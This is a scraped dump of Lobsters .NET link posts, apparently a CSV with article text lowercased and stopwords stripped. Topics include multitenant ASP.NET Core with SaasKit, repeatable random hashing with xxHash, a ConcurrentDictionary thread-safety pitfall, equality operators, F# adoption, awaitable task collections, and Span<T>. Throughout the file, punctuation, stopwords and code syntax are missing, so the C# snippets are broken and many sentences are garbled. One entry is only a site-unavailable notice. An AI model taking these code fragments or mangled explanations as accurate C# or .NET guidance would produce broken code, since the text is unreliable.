ready go open startup class add line anywhere inside configureservices method servicesaddmultitenancy tenant cachingtenantresolver next add line configure method usestaticfiles usemvc appusemultitenancy tenant configure method represents actual request pipeline order matter update view piece place start referring current tenant code view open viewshomeindexcshtml view replace whole file markup inject tenant tenant model questionlistviewmodel viewdata title home page div class row div class welcome strong tenantname strong tenantdescription div div div class row div class popular question ul foreach var question modelquestions li questiontitle li ul div div inject directive get current tenant saaskit model directive tell aspnet core view backed new model class create create questionlistviewmodelcs file model directory using systemcollectionsgeneric namespace questionexchangemodels public class questionlistviewmodel public ienumerable question question get set query database homecontroller responsible rendering index view edited open replace index method one public async task iactionresult index var topquestions await context question q qtenantid currenttenantid orderbydescending q qupdatedat take toarrayasync var viewmodel new questionlistviewmodel question topquestions return view viewmodel query get newest five question tenant granted one question right populates view model large application typically put data access code service repository layer keep controller simple example code added need context currenttenant available controller yet make available adding constructor class public class homecontroller controller private readonly appdbcontext context private readonly tenant currenttenant public homecontroller appdbcontext context tenant tenant context context currenttenant tenant existing code keep compiler complaining add declaration top file using microsoftentityframeworkcore test app test tenant added database tied fake domain bufferoverflowlocal dboverflowlocal need edit host file test local machine bufferoverflowlocal dboverflowlocal start project dotnet run clicking start visual studio application begin listening url like visit url directly see error set default tenant behavior yet instead visit http see one tenant multitenant application switch http view tenant adding tenant simple matter adding row tenant table build scalable multitenant apps whether building multitenant enterprise app next stack overflow aspnet core great framework build post built simple aspnet core application us saaskit multitenancy thanks citus data sharded easy scaling colocated fast query multitenant architecture aspnet saaskit postgres citus handle hundred thousand tenant without breaking sweat find example application github need help getting multitenant application prepared scale feel free join citus slack channel learn chat question may enjoy reading interested reading post team sign monthly newsletter get latest content delivered straight inbox
307,Lobsters,dotnet,"C#, F#, .NET programming",A Primer on Repeatable Random Numbers (2015),https://blogs.unity3d.com/2015/01/07/a-primer-on-repeatable-random-numbers/,primer repeatable random number,creating anything procedural almost guaranteed come need random number one point want able produce result need random number repeatable minecraft example case random number generator would want specific random number sequence use random number generator different seed value stack overflow question rng procedural content random hash function discussion google group ent pseudorandom number sequence test program hash implementation optimized procedural generation implementation xxhash hash function c bitbucket combining hash function rngs conclusion available bitbucket runevision blog appendix note continuous noise appendix b test result seed input value best use large number seed random number generator take number get going rngs java better randomness number differently seeded sequence come fine use different seed random hash function rngs appendix c comparison hash function smhasher stack overflow question good hash function uniqueness speed written xxhash google code page test framework smhasher test framework,creating anything procedural almost guaranteed come need random number one point want able produce result need random number repeatable article use levelworld generation game example use case lesson applicable many thing procedural texture model music etc however meant application strict requirement cryptography would want repeat result ability revisit levelworld example certain levelworld created specific seed seed used get levelworld example minecraft persistent world generated fly world generated fly player move around may want location remain first subsequent time player visit location like minecraft upcoming game man sky others rather different time driven dream logic world everyone maybe want game world everyone play exactly procedurally generated example case man sky essentially ability revisit levelworld mentioned except seed always used mentioned word seed time seed number text string data used input order get random output defining trait seed seed always produce output even slightest change seed produce completely different output article look two different way produce random number random number generator random hash function reason using one thing know hard earned seem readily available elsewhere thought would order write share random number generator common way produce random number using random number generator rng short many programming language rng class method included word random name obvious goto approach get started random number random number generator produce sequence random number based initial seed objectoriented language random number generator typically object initialized seed method object repeatedly called produce random number code c could look like csharp random randomsequence new random int randomsequencenext int randomsequencenext int randomsequencenext csharp case getting random integer value maximum possible integer value trivial convert random integer specific range random floating point number similar often method provided box image first number generated random class c seed random number represented pixel brightness black white important understand get third random number without first getting first second one oversight implementation nature rng generates random number using previous random number part calculation hence talk random sequence mean rngs great need bunch random number one need able get specific random number say random number sequence luck well could call next time use last number bad idea would want specific random number sequence generate everything probably need specific random number sequence least think reason however generate thing bit bit fly example say three section world b c player start section section generated using random number player proceeds section b generated using different number generated section destroyed time free memory player proceeds section c yet different number section b destroyed however player go back section b generated random number first time order section look use random number generator different seed value common misconception rngs fact different number sequence random relation indexed number different sequence random relation even may look like first glance sequence take first number number random relation better take number sequence point people skeptical fine also look stack overflow question rng procedural content trustworthy something bit fun informative let experiment look result let look number generated sequence reference compare number created getting first number sequence created seed though pattern rather uniformly distributed quite random fact shown output purely linear function comparison apparent using number subsequent seed barely better using linear function still almost random though good enough point good idea introduce better way measure randomness since naked eye reliable enough output look random enough well yes end goal simply thing look sufficiently random random number output look different depending used generation algorithm may transform random value kind way reveal clear pattern hidden inspecting value listed simple sequence alternative way inspect random output create coordinate pair random number plot coordinate image coordinate land pixel brighter pixel get let take look coordinate plot random number sequence random number created individual sequence different seed oh let throw linear function perhaps surprisingly creating coordinate random number different seed coordinate plotted thin line rather anything near uniformly distributed like linear function imagine created coordinate random number order plant tree terrain tree would planted straight line remaining terrain empty conclude random number generator useful need access number specific order might want look random hash function random hash function general hash function function used map data arbitrary size data fixed size slight difference input data producing big difference output data procedural generation typical use case provide one integer number input get random number output example large world part generated time typical need get random number associated input vector location world random number always given input unlike random number generator rngs sequence get random number order like code c could look like note get number order like csharp randomhash randomhashobject new randomhash int randomhashobjectgethash int randomhashobjectgethash int randomhashobjectgethash csharp hash function may also take multiple input mean get random number given coordinate csharp randomhash randomhashobject new randomhash randomnumbergrid randomhashobjectgethash randomnumbergrid randomhashobjectgethash randomnumbergrid randomhashobjectgethash randomnumbergrid randomhashobjectgethash csharp procedural generation typical use hash function hash function well suited procedural generation may either sufficiently random distribution unnecessarily expensive one use hash function part implementation data structure hash table dictionary often fast sufficiently random since meant randomness making algorithm perform efficiently theory mean random well practice found resource compare randomness property one tested turned fairly bad randomness property see appendix c detail another use hash function cryptography often random also slow since requirement cryptographically strong hash function much higher value look random goal procedural generation purpose random hash function look random also efficient meaning slower need chance suitable one built programming language choice need find one include project tested different hash function based recommendation information various corner internet selected three comparison pcghash got hash function adam smith discussion google group forum procedural content generation adam proposed little skill hard create random hash function offered pcghash code snippet example may one wellknown hash function also cryptographic strength expensive need purpose top typically need int return value return much larger hash value throwing away nevertheless worth including comparison xxhash highperforming modern noncryptographic hash function nice random property great performance apart generating noise sequence image coordinate plot also tested randomness testing suite called ent pseudorandom number sequence test program included select ent stats image well stat devised call diagonal deviation latter look sum diagonal line pixel coordinate plot measure standard deviation sum result three hash function pcghash stand appears random noise image sequential random value coordinate plot reveals clear pattern mean hold well simple transformation conclude rolling random hash function hard probably left expert xxhash seem comparable random property xxhash around time faster xxhash also advantage although rng still concept seed case hash function able specify seed clear advantage procedural generation since use different seed different random property entity grid cell similar use entity index cell coordinate input hash function asis crucially xxhash number differently seeded sequence random relation see appendix detail hash implementation optimized procedural generation investigation hash function become clear good choose hash function highperforming generalpurpose hash benchmark crucial performance optimize procedural generation need rather using hash function asis two important optimization avoid conversion integer byte generalpurpose hash function take byte array input return integer byte hash value however highperforming one convert input byte integer since operate integer internally since common procedural generation get hash based integer input value conversion byte completely pointless refactoring reliance byte away triple performance leaving output identical implement noloop method take one input generalpurpose hash function take input data variable length form array useful procedural generation common us probably get hash based input integer creating optimized method take fixed number integer rather array eliminate need loop hash function dramatically improve performance around test expert low level optimization dramatic difference could caused either implicit branching loop need allocate array current recommendation hash function use implementation xxhash optimized procedural generation see appendix c detail get implementation xxhash hash function c bitbucket maintained privately free time unity technology besides optimization also added extra method get output integer number specified range floating point number specified range typical need procedural generation note time writing added single integer input optimization xxhash add optimized overload two three integer input get time combining hash function rngs random hash function random number generator also combined sensible approach use random number generator different seed seed passed random hash function rather used directly imagine large maze world possibly nearly infinite world large scale grid grid cell maze player move around world maze generated grid cell surrounding player case want maze always generated way every time visited random number needed need able produced independently previously generated number however maze always generated one whole maze time need control order individual random number used one maze ideal approach use random hash function create seed maze based coordinate grid cell maze use seed random number generator sequence random number c code could look like csharp randomhash randomhashobject new randomhash int mazeseed randomhashobjectgethash cellcoordx cellcoordy random randomsequence new random mazeseed int randomsequencenext int randomsequencenext int randomsequencenext csharp conclusion need control order querying random number use suitable random hash function xxhash implementation optimized procedural generation need get bunch random number order matter simplest way use random number generator systemrandom class c order number random relation either single sequence initialized one seed used multiple seed used passed random hash function xxhash first source code random number testing framework referred article well variety rngs hash function available bitbucket maintained privately free time unity technology article originally appeared runevision blog dedicated game development research free time appendix note continuous noise certain thing want able query noise value continuous meaning input value near produce output value also near typical us terrain texture requirement completely different one discussed article continuous noise look perlin noise better simplex noise however aware suitable continuous noise querying continuous noise function get random number unrelated random number produce poor result since algorithm optimized example found querying simplex noise function integer position return every third input additionally continuous noise function usually use floating point number calculation worse stability precision get origin appendix b test result seed input value heard various misconception year try address best use large number seed seen anything indicates look test image throughout article difference result low high seed value random number generator take number get going look test image see sequence random value follow pattern start upper left corner proceeding one line end image tested number sequence well number sequence seen apparent significant difference lack quality randomness rngs java better randomness number differently seeded sequence maybe tiny bit better nearly enough unlike random class c random class java use provided seed asis shuffle bit bit storing seed resulting number different sequence may tiny bit random looking see test stats serial correlation much better however clear coordinate plot number still collapse single line used coordinate said reason rng apply highquality random hash function seed using fact seems like good idea downside think popular rng implementation aware described previously come fine use different seed random hash function rngs intrinsic reason hash function xxhash treat seed value similar input meaning essentially applies high quality random hash function seed speak implemented way safe use nth number differently seeded random hash object appendix c comparison hash function original version article compared pcghash recommended using excellent randomness property decent speed author implemented parallel framework testing hash function called smhasher become widely used framework purpose also good information stack overflow question good hash function uniqueness speed compare lot hash function seems paint equally favorable picture murmurhash publishing article got recommendation ara pranckevičius look xxhash nathan reed look wang hash written xxhash hash function apparently beat murmurhash turf scoring high quality smhasher testing framework significantly better performance read xxhash google code page initial implementation removed byte conversion slighter faster though nearly much faster shown smhasher result also implemented wanghash quality proved insufficient since showed clear pattern coordinate plot five time faster xxhash tried implementing wangdoublehash result fed fine quality test still three time faster xxhash however since wanghash wangdoublehash take single integer input opted also implement single input version xxhash see effect would performance turned improve performance dramatically around time faster much fact xxhash faster wangdoublehash quality test framework reveals fairly obvious flaw nearly sophisticated smhasher test framework hash function score high assumed better seal quality randomness property looking fine test general would say passing test test framework may sufficient procedural generation purpose since xxhash optimized version fastest hash function passing test anyway nobrainer use extremely many different hash function would always possible include even comparison however focused primarily widely recognized best performing one term randomness quality performance optimized procedural generation think result produced version xxhash fairly close optimal gain finding using something even better likely going small said feel free extend test framework implementation
308,Lobsters,dotnet,"C#, F#, .NET programming",ConcurrentDictionary Is Not Always Thread-Safe,http://blog.i3arnon.com/2018/01/16/concurrent-dictionary-tolist/,concurrentdictionary always threadsafe,constructor method extension method,concurrentdictionary threadsafe dictionary implementation surprisingly least member safely used multiple thread concurrently thread safety section concurrentdictionary msdn article say public protected member concurrentdictionary tkey tvalue threadsafe may used concurrently multiple thread however member accessed one interface concurrentdictionary tkey tvalue implement including extension method guaranteed thread safe may need synchronized caller guaranteed invoking concurrentdictionary method property thread safe since implement several interface eg idictionary icollection using one member extension method one example linq enumerabletolist extension method ienumerable using concurrentdictionary instance mutated thread may throw argumentexception simple repro var dictionary new concurrentdictionary int int taskrun var random new random true var value randomnext dictionary value value true dictionarytolist happens extension method call list constructor accepts ienumerable constructor optimization icollection concurrentdictionary implement public list ienumerable collection icollection c collection icollection c null int count ccount count item emptyarray else item new count get dictionary size ccopyto item copy dictionary array size count else first get size dictionary invoking count initializes array size finally call copyto copy keyvaluepair item dictionary array since dictionary mutated multiple thread size increase decrease count invoked copyto result argumentexception concurrentdictionary try access array outside bound need separate collection dictionary item exception avoided calling concurrentdictionarytoarray method instead operates similar way acquiring dictionary internal lock public keyvaluepair tkey tvalue toarray int locksacquired try acquirealllocks ref locksacquired int count checked int mtablesmlockslength count mtablesmcountperlock keyvaluepair tkey tvalue array new keyvaluepair tkey tvalue count copytopairs array return array finally releaselocks locksacquired method however confused linq enumerabletoarray extension method may throw argumentexception like enumerabletolist concurrentdictionarytoarray win overload resolution enumerabletoarray since latter extension method dictionary used one interface inherits ienumerable enumerabletoarray method called exception may thrown following piece code throw var dictionary new concurrentdictionary int int taskrun var random new random true var value randomnext dictionary value value true dictionarytoarray explicitly holding dictionary idictionary variable idictionary int int dictionary new concurrentdictionary int int taskrun var random new random true var value randomnext dictionary value value true dictionarytoarray
309,Lobsters,dotnet,"C#, F#, .NET programming",LambdaConf 2018: Call for Proposals,https://lambdaconf2018.dryfta.com/en/abstract-submission,lambdaconf call proposal,,event website either suspended unavailable use visitor attendee please contact event organizer correct link website dryfta support team
310,Lobsters,dotnet,"C#, F#, .NET programming",One equality operator to rule them all,https://mzabani.wordpress.com/2018/01/02/one-equality-operator-to-rule-them-all/,one equality operator rule,plan article convince one equality operator first second third fourth pretty http article edit nullable reference type like,lot programming language two different concept equality reference equality also called identity value equality reference equality equality memory address two object instance iif occupy address memory value equality semantic equality two object equal value mean thing example two instance ipaddress represent address equal even instantiated different place plan article convince one equality operator let make point first nullsafe equality operator mean language mean comparing object throw null reference get compared language operator equal instance method problematic null check object first end forgetting eventually would much better removed null reference modern language good let leave second boxing two kind equality dangerous mix clear realize object object problem waiting happen really course really rethink code operating boxed object least c creating generic polymorphic code almost certainly better approach third many case reference equality simply misleading c instance ipaddressparse ipaddressparse type conveys meaning thought according assigned meaning unless tracking instance reference equality far confusing useful fourth generally importantly operator mean two different thing dangerous well really mean mean maybe reference equality maybe value equality mean two distinct thing depending get compared one unique formappearance good addition number concatenating string signature different hard get wrong would think addition integral number type int long meant addition rounding fractionals float double would make proper add method available obviously sure would think error waiting happen previous case would le solved created clear separation equality operator kotlin example value equality reference equality would like convince however need one kind equality general use reference equality used implement equality operator propose let u explore interesting case interesting case socket class working multiple socket often necessary compare one another two socket connected address port equal independent communication channel value equality spoil fact two socket use different local port even socket connected modified yet operating system label socket manage internally course operating system could use memory address created socket internally would socket label even case need one equality operator happens case may implemented comparing memory address case socket happen case desirable make equality reference equality case semantics match identity implementation socket could use objectreferenceequals note reference equality would used properly implement beloved equality operator ok example good exception believe although course provide formal proof one thing know one kind equality haskell haskell used lot already surprised language fix c sadly believe possible without changing language substantially breaking existing code propose least invasive set change think language certainly pretty better way around problem proposed breaking change could make operator non overridable make implementation always use equal instance method leftmost non null argument proper null check one could argue choosing leftmost argument would make implementation asymmetric however correct implementation equality necessarily symmetric b b matter implementation picked leftmost argument call equal also could go ahead change generic b make nonissue would break even code sure would sound language designer though also concern efficiency calling virtual method like equal would involve dynamic dispatch bringing associated cost believe unavoidable unless willing go even breaking change proposal implement type class c http type class enable high level adhoc polymorphism maintaining static dispatch great feature one vouch strongly curious read article type class could make operatorfunction equatable type class would make default implementation like one described still overridable override type avoid calling equal thought counterexample disagree issue think unintended consequence changing language proposed sure many edit sure missed new feature nullable reference type make proposed language change mostly unnecessary also breaking change course improve language significantly also improves state equality opting new feature make sure never use stick equal mostly fine say mostly even equal always overridden mean value equality case stringbuilder instance equal object inherited object test reference equality iequatable stringbuilder equal stringbuilder method test value equality believe strengthens claim single general purpose equality operator keeping reference equality mean implement equality case like like loading
311,Lobsters,dotnet,"C#, F#, .NET programming",Why I got hooked on F#,http://devonburriss.me/why-i-got-hooked-on-fsharp/,got hooked f,article mark seemann fsharpforfunandprofit pluralsight manning functional programming c honest argument honest return type better error handling language extension functional architecture pit success dependency injection dependency rejection domain modelling made functional fsharpforfunandprofit first f themed blog post fsadvent calendar first pr f open source project reading post language reduce potential error learning f watching video falling pit success dependency rejection designing capability railway oriented programming recommended book domain modelling made functional fsharpforfunandprofit functional programming c realworld functional programming credit john mark arnold,asked time got started f people found difficult false start looked weird nt know start different oo c style language tooling slick honestly think better question start using f matured developer come appreciate coding practice constrain option way minimizes potential error infinitely flexible design also one allows possible error known unknown constraining future developer make illegal state unrepresentable overstated design goal sometimes say code like future developer idiot current idiot future clear say oo constructor factory hidden constructor encapsulation smart apis big part guideline around aggregate domaindriven design ddd keeping aggregate consistent lot pattern practice oo help lot fact quite difficult new developer get speed since often struggling technical implementation feature worrying much intricacy design whether lead future developer pit success coach hopefully good coaching learn thing faster trial error help wonder simpler way get well designed software absorbing pattern practice note said simple easy functional programming fp mathematical basis make claim correctness correctness hard certain global state constantly flux oo centric application fp revolves around function input output input always yielding output pure function basically broken point correctness program fewer concept need known develop maintainable software remember reading article mark seemann thinking seems like problem quite relate conclusion see next section took year get place could read article nod head instead scratch keeping note highlight remember think important since trying learn apply many technical approach highlighted ddd lead much focus type whose instance state changed controlled way type descriptive domain try reuseable rather represent specific use case time rolled around heard promise fp made even file new project ed f console application little success resolved give better try started reading fsharpforfunandprofit looking pluralsight video contacted manning give feedback early draft functional programming c enrico buonanno give really deep introduction functional concept pattern showing implementation usage fp c quite nice could absorb concept without getting hung syntax new programming language inspired series post honest type namely honest argument honest return type better error handling work code started taking functional style c project started making use language extension repository demonstrating use case early writing small console apps f would crunch csv file merge pdf document great realized although getting used f syntax missing something key structure application penny dropped watching video mark seemann functional architecture pit success another good one released later dependency injection dependency rejection talk purity composing application code dependency io outside sound like cleanonionhexagonal architecture absolutely right end finished domain modelling made functional scott wlaschin fsharpforfunandprofit fame brings together many deep topic approachable way difficult compare book read nt assume knowledge yet learned f fp ddd even though read multiple book dedicated topic scott develops feature beginning end practical way distills teach core concept advanced topic without getting bogged theory realize sounding like fan boy would honestly recommend book teach fp f ddd teach brilliantly december posted first f themed blog post part fsadvent calendar submitted first pr f open source project winding fp related blog post looking forward next year brings learn reading post mark seemann brilliant post language reduce potential error scott wlaschin learning f watching video mark excellent talk falling pit success another dependency rejection designing capability railway oriented programming recommended book domain modelling made functional fsharpforfunandprofit functional programming c realworld functional programming credit header photo john mark arnold
312,Lobsters,dotnet,"C#, F#, .NET programming",Duck Typing And Async/Await,http://blog.i3arnon.com/2018/01/02/task-enumerable-awaiter/,duck typing asyncawait,asyncutilities github,may know many feature c light duck typing duck typing accept object behaves certain way ie certain method property etc instead specific type usually explained walk like duck talk like duck duck foreach statement example look type implement ienumerableienumerable instead expects getenumerator method return enumerator type either class struct movenext current following code clearly break runtime compiler issue void foo foreach var item new fakeenumerable consolewriteline item class fakeenumerable public fakeenumerator getenumerator new fakeenumerator struct fakeenumerator public bool movenext throw new notimplementedexception public object current throw new notimplementedexception one feature asyncawait taskbased asynchronous pattern compiler expect task task specifically look getawaiter method return awaiter turn implement inotifycompletion iscompleted enables optimization operation completes synchronously oncompleted accepts callback invoke asynchronous operation completes getresult return result operation one rethrows exception one occurred getawaiter also extension method possible turn existing type awaitables right custom awaiter recently made awaiter awaiting collection task together calling taskwhenall wrapping returned task awaiter struct taskenumerableawaiter inotifycompletion private taskawaiter awaiter public bool iscompleted awaiteriscompleted internal taskenumerableawaiter ienumerable task task awaiter taskwhenall task getawaiter public void oncompleted action continuation awaiteroncompleted continuation public void getresult awaitergetresult public static class enumerableextensions public static taskenumerableawaiter getawaiter ienumerable task task new taskenumerableawaiter task getawaiter extension method ienumerable task returning taskenumerableawaiter mean compiler treat collection task awaitable await like task httpclient httpclient new httpclient async task downloadallasync var url new http wwwgooglecom http wwwgithubcom http wwwtwittercom await urlsselect downloadasync async task downloadasync string url var content await httpclientgetstringasync url consolewriteline content may confusing developer familiar enough asyncawait recommend bestpractice still interested added support asyncutilities library also support awaiting ienumerable task tresult disabling synchronizationcontext capturing configureawait utilizes c readonly struct complete code found github
313,Lobsters,dotnet,"C#, F#, .NET programming",.Net Core 2.0 Performance Notes Revisited,http://anthonylloyd.github.io/blog/2017/12/30/dotnetcore-performance-part2,net core performance note revisited,net core performance note revisited f advent calendar benchmark game post expectisfasterthan c v java f v c f v java f v haskell f v ocaml f v python post,net core performance note revisited dec post part f advent calendar series many thanks sergey tihon organizing past week submitting improvement f program benchmark game previous post c program since post thing moved c currently faster java program java faster regexredux net core nt yet compiled regex implementation knucleotide java make use dictionary well suited program available c submission f program port c code recently optimised fasta knucleotide optimisation discovered arraypool useful case fasta knucleotide largest dictionary constructed efficiently four parallel part another tempting optimisation one one replacement f use native pointer array eg arrayget becomes nativeptrget actually provided small improvement case nt always done feel must plug expecto expectisfasterthan quick way checking one implementation truly faster another proven invaluable c v java f v c f v java f v haskell f v ocaml f v python pidigits error error reversecomplement fannkuchredux binarytrees nbody mandelbrot fasta knucleotide regexredux error spectralnorm mentioned previous post caveat result represent current state set program specific test machine however enough evidence general conclusion overall result net core impressive compared managed platform f performance worst case behind c f highlevel language result simpler shorter code good even extreme lowlevel performance benchmark far behind c f fact show good performance java resulting five draw mean f would expected perform better scala kotlin participate benchmark f look best performance among functional language due performance net core able write f functionalfirst style hopefully see continued adoption net core f happy new year
314,Lobsters,dotnet,"C#, F#, .NET programming",Reflecting on F# in 2017,https://medium.com/@_cartermp/reflecting-on-f-in-2017-5ac67fb138ff,reflecting f,twitter ionide increased visual studio ncreased net core actual f released visual studio f tooling five major update net core net standard project vasily kirichenko saul rennison anhdung phan steffen forkmann default nightly release channel visual studio mac f support inbox azure function azure notebook fsharpcore fsharpcompilertools f inband net core sdk f language suggestion f rfc ionide paket jetbrains rider f support net standard net core suave giraffe freya fable fullstack f application f software foundation continued steady growth diversity program mentorship program openfsharp build ndc conference net conf every single person involved item feel proud accomplishment community hero rich minerich dmitry morozov gien verschatse mathias brandewinder chet husk cezary wojcik marnee dearman marcus griep krzysztof cieślak tomas petricek evelina gabasova marcus griep riccardo terrell gien verschatse mark gray paulmichael blasucci enrico sada alfonso garciacaro jérémie chassaing talking smack golang ross mckinlay eirik tsarpalis andrea magnorsky hup hup andrea magnorsky scott wlaschin alfonso garcia caro twice gresearch amazing os contributor syme,exciting year f begin f grown bigger ever least far measure product telemetry twitter activity github activity f software foundation activityactive unique user f measure ten thousandsmeasured unique user visual studio code ionide increased year become far larger evermeasured unique user visual studio use f increased since last year larger ever despite quality issue earlier year believe inhibited growthmuch measured growth coincides release net core shown significant interest f communitytelemetry complicated topic try account existing user using f environment without telemetry never perfect actual usage f world strictly higher measurebut number metric limited tell small part story attempt summarize major thing happened f yearf released notably first version language net core support multiple update since initial releasevisual studio f tooling shipped five major update including support net core net standard projectsincredible member f community vasily kirichenko saul rennison anhdung phan steffen forkmann others made significant improvement visual studio f tooling including adding dizzying array featuresf installed visual studio default installing net coref tooling visual studio nightly release channelvisual studio mac launched f support inbox continually improved throughout yearazure function support f even better thing coming soonazure notebook support f fsharpcore official package f core libraryfsharpcompilertools official place f compiler sdk deployed recommended way attain sdkf inband net core sdkwe expanded team hired end year f language suggestion f rfc repository official place f language tooling evolutionionide plugin suite turn visual studio code fullyfeatured f ide shipped least release jeez many paket awesome nuget client used many f project seemingly shipped billion release yearjetbrains rider shipped excellent everimproving f supportmuch f os ecosystem migrated net standard net core represents incredible amount work part maintainer suave giraffe emerged two dominant library use writing web service net core freya brilliant alternative everyone try wellfable rapidly evolved interesting project potential impressive fullyfledged alternative javascript browser allowing write fullstack f applicationsthe f software foundation fssf continued steady growth become one best organization part beginning f fssf launched diversity program another strong round free mentorship programopenfsharp created sold quickly despite lowkey advertisement get kind excited f usf notable presence build ndc conference net conf functional programming conferenceswew lot probably missed thing matter people please let know feel list somethingif single thing feel looking list pride immediate colleague member f community done many incredible thing across wide spectrum entire f ecosystem every single person involved item feel proud accomplishment american thus prone superlative rock star humbled work alli also like mention thing matter personal level one honored one community hero announced openfsharp got stay openfsharp talking kind craziness beer rich minerich dmitry morozov gien verschatse mathias brandewinder chet husk cezary wojcik marnee dearman marcus griep mathias kind enough provide apartment venue shenanigansi got hang krzysztof cieślak tomas petricek evelina gabasova marcus griep riccardo terrell gien verschatse mark gray paulmichael blasucci enrico sada alfonso garciacaro jérémie chassaing others cambridge london beer food taking bar cavorting around city enjoying sunshine talking smack golang everything else happened much funi got witness pink pezi ross mckinlay steal eirik tsarpalis badge f exchange walk around calling greek programmer named eirik ross eiriktsarpalisprovider type provider library use day provide type named ross also provide type named eirik one honored cowherded syme style andrea magnorsky leave f exchange venue hup hup got andrea magnorsky pull aside f exchange wonderful serious conversation sort thing community needed hear conference beyond oh gave functionalcat sticker laptop proudly display day got meet scott wlaschin whose prolific blogging taught f great still college student got watch alfonso garcia caro launch fable codenamed narumi honored present twice fablei got hang multiple time wonderful folk form gresearch londoni got engage daily amazing os contributor f ecosystemi got syme think numerous suggestion mine good idea someone got college degree june pretty big deal think rare find job field rewarding lot stress involved problem need solving issue need addressing never simple worth every time
315,Lobsters,dotnet,"C#, F#, .NET programming",Open Source .NET – 3 years later,http://www.mattwarren.org/2017/12/19/Open-Source-.Net-3-years-later,open source net year later,open source net year later open sourcing large part net framework scott hanselman connect keynote covering subject historical perspective sausage get made repository activity time level activity repo issue pull request yay sparklines ftw process note issue pull request visual studio code total participation last year november november microsoftcommunity split note november november note summary thriving open source product hacker news rprogramming,open source net year later dec word little year ago microsoft announced open sourcing large part net framework scott hanselman said connect keynote community contributing significant way post form part ongoing series want see thing changed time check previous one addition recently done talk covering subject slide historical perspective year line interesting go back see aim started want know recommend watching channel video made microsoft engineer involved process always plain sailing fair say bump along way guess happens get see sausage get made think ended good place past year notable event think worth mentioning repository activity time onto data first going look overview level activity repo looking total number issue created pull request closed per month yay sparklines ftw interested got data see previous post process note number black recent month red dot showing lowest green dot highest previous value toggle issue pull request clicking button hover individual sparklines get tooltip showing permonth value click project name take github page repository data give good indication healthy different repos growing time staying also see different level activity repo compare one whilst clear visual studio code way ahead repos term issue interesting see netonly one pullrequests notably corefx base class library roslyn compiler coreclr runtime next look total participation last year ie november november pull request issue treated equally large pr count one fix spelling mistake whilst ideal simplest way get idea microsoftcommunity split note hover bar get actual number rather percentage issue microsoft community pull request microsoft community finally see permonth data last year ie november november note inspect different repos selecting pulldown list aware yaxis graph rescaled maximum value change time issue microsoft community pull request microsoft community summary clear community continues invested netrelated open source repository contributing significantly sustained period time think good net developer whether contribute os net thriving open source product many benefit discus post hacker news rprogramming
316,Lobsters,dotnet,"C#, F#, .NET programming",LiteDB - A .NET NoSQL Document Store in a single data file,http://www.litedb.org/,litedb net nosql document store single data file,standalone database,standalone database litedb serverless database delivered single small dll fully written net c managed code compatible net netstandard install via nuget copy dll bin project folder
317,Lobsters,dotnet,"C#, F#, .NET programming",C# - All About Span: Exploring a New .NET Mainstay,https://msdn.microsoft.com/en-us/magazine/mt814808.aspx,c span exploring new net mainstay,article c span exploring new net mainstay stephen toub span span implemented memory need figure figure nonallocatingnoncopying conversion spanrelated type span memory integrate net library net runtime c language compiler next githubcomdotnetcoreclr githubcomdotnetcorefx stephen toub githubcomstephentoub discus article msdn magazine forum,minute read article january volume number c span exploring new net mainstay stephen toub january article updated reflect technical change following publication imagine exposing specialized sort routine operate inplace data memory likely expose method take array provide implementation operates great caller array want whole array sorted caller want part sorted probably also expose overload took offset count wanted support data memory array instead came native code example lived stack pointer length could write sort method operated arbitrary region memory yet worked equally well full array subset array also worked equally well managed array unmanaged pointer take another example implementing operation systemstring specialized parsing method likely expose method take string provide implementation operates string wanted support operating subset string stringsubstring could used carve piece interesting relatively expensive operation involving string allocation memory copy could mentioned array example take offset count caller string instead char caller char like one created stackalloc use space stack result call native code could write parsing method way force caller allocation copy yet worked equally well input type string char char situation might able use unsafe code pointer exposing implementation accepted pointer length however eliminates safety guarantee core net open problem like buffer overrun access violation net developer thing past also invite additional performance penalty needing pin managed object duration operation pointer retrieve remains valid depending type data involved getting pointer may practical answer conundrum name span span systemspan new value type heart net enables representation contiguous region arbitrary memory regardless whether memory associated managed object provided native code via interop stack still providing safe access performance characteristic like array example create span array var arr new byte span byte byte arr implicit cast span easily efficiently create span representpoint subset array utilizing overload slice method index resulting span write read data relevant portion original array span byte slicedbytes bytesslice start length slicedbytes slicedbytes assertequal slicedbytes assertequal slicedbytes assertequal arr slicedbytes assertequal arr slicedbytes slicedbytes throw indexoutofrangeexception byte ok assertequal arr byte assertequal arr mentioned span way access subset array also used refer data stack example span byte byte stackalloc byte using c stackalloc support span byte byte assertequal byte assertequal byte byte throw indexoutofrangeexception generally used refer arbitrary pointer length memory allocated native heap like intptr ptr marshalallochglobal try â span byte byte â unsafe byte new span byte byte ptr â byte â assertequal byte â assertequal marshalreadbyte ptr byte â byte throw indexoutofrangeexception finally marshalfreehglobal ptr span indexer take advantage c language feature introduced c called ref return indexer declared return type provides semantics like indexing array returning reference actual storage location rather returning copy life location public ref int index get impact refreturning indexer obvious via example comparing list indexer ref returning example struct mutablestruct public int value span mutablestruct spanofstructs new mutablestruct spanofstructs value assertequal spanofstructs value var listofstructs new list mutablestruct new mutablestruct listofstructs value error return value variable second variant span called systemreadonlyspan enables readonly access type like span except indexer take advantage new c feature return readonly instead enabling work immutable data type like systemstring readonlyspan make efficient slice string without allocating copying shown string str hello world string worldstring strsubstring startindex length allocates readonlyspan char worldspan strasspan slice start length allocation assertequal w worldspan worldspan error indexer assigned span provide multitude benefit beyond already mentioned example span support notion reinterpret cast meaning cast span byte span int index span int map first four byte span byte way read buffer byte pas method operate grouped byte ints safely efficiently span implemented developer generally need understand library using implemented however case span worthwhile least basic understanding detail behind detail imply something performance usage constraint first span value type containing ref length defined approximately follows public readonly ref struct span â private readonly ref pointer â private readonly int length â concept ref field may strange fact one actually declare ref field c even msil span actually written use special internal type runtime treated justintime jit intrinsic jit generating equivalent ref field consider ref usage likely much familiar public static void addone ref int value value var value new int addone ref value assertequal value code pass slot array reference optimization aside ref stack ref span idea simply encapsulated inside struct type contain ref directly indirectly called reflike type c compiler allows declaration reflike type using ref struct signature brief description two thing clear span defined way operation efficient array indexing span require computation determine beginning pointer starting offset ref field already encapsulates contrast arraysegment separate offset field making expensive index pas around nature span reflike type brings constraint due ref field second item interesting ramification result net containing second related set type led memory memory need span reflike type contains ref field ref field refer beginning object like array also middle var arr new byte span byte arrasspan start span byte new span byte arr arrlength span byte memorymarshalcreatespan byte arr ref arr arrlength reference called interior pointer tracking relatively expensive operation net garbage collector runtime constrains ref live stack provides implicit low limit number interior pointer might existence span previously shown larger word size mean reading writing span atomic operation multiple thread read write field heap time risk imagine already initialized span containing valid reference corresponding length one thread start writing new span get far writing new pointer value set corresponding length second thread read span including new pointer old longer length result span 